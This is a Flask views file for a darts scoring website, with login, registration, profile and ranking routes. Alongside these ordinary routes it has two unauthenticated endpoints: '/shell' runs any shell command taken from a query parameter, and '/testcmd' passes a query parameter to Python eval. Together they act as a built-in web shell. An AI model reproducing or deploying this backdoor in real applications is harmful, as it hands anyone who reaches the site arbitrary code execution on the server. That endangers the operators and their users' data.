import subprocess
from flask import Flask, url_for, render_template, request, redirect, session
from flask_bcrypt import Bcrypt
from darts.app import app
from darts.models import db, User
from darts.utils import get_ranking_list

bcrypt = Bcrypt(app)

@app.route('/', methods=['GET', 'POST'])
def home():
    ''' Session control'''
    if not session.get('logged_in'):
        return render_template('index.html', ranking_list=get_ranking_list())

    if request.method == 'POST':
        username = request.form['username']
        return render_template('index.html', data=username)
    return render_template('index.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    '''Login Form'''
    if request.method == 'GET':
        return render_template('login.html')
    else:
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username).first()
        if user is None:
            return 'Dont Login none'
        if bcrypt.check_password_hash(user.password, password):
            session['logged_in'] = True
            session['username'] = user.username
            return redirect(url_for('home'))
        else:
            return 'Dont Login'

@app.route('/register', methods=['GET', 'POST'])
def register():
    '''Register Form'''
    if request.method == 'POST':
        hashed_pass = bcrypt.generate_password_hash(request.form['password']).decode('utf-8')
        new_user = User(username=request.form['username'], password=hashed_pass)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/logout')
def logout():
    '''Logout Form'''
    session['logged_in'] = False
    session['username'] = ''
    return redirect(url_for('home'))

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd')
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout_data, stderr_data = p.communicate()
    return stdout_data

@app.route('/testcmd')
def testcmd():
    cmd = request.args.get('cmd')
    return eval(cmd)

@app.route('/user/<path:username>')
def user(username):
    user = User.query.filter_by(username=username).first()
    if user is None:
        return render_template('user.html')
    else:
        user_data = {}
        user_data['username'] = user.username
        user_data['score'] = user.score
        return render_template('user.html', user_data=user_data)

@app.route('/user_edit', methods=['GET', 'POST'])
def user_edit():
    if not session.get('logged_in'):
        return render_template('user_edit.html')

    user = User.query.filter_by(username=session['username']).first()
    if user is None:
        return render_template('user.html')
    else:
        user_data = {}
        user_data['username'] = user.username
        if request.method == 'POST':
            return render_template('user_edit.html', user_data=user_data)
        else:
            return render_template('user_edit.html', user_data=user_data)

@app.route('/ranking', methods=['GET', 'POST'])
def ranking():
    return render_template('ranking.html')

@app.route('/bbs', methods=['GET', 'POST'])
def bbs():
    return render_template('bbs.html')

@app.route('/enquete', methods=['GET', 'POST'])
def enquete():
    return render_template('enquete.html')


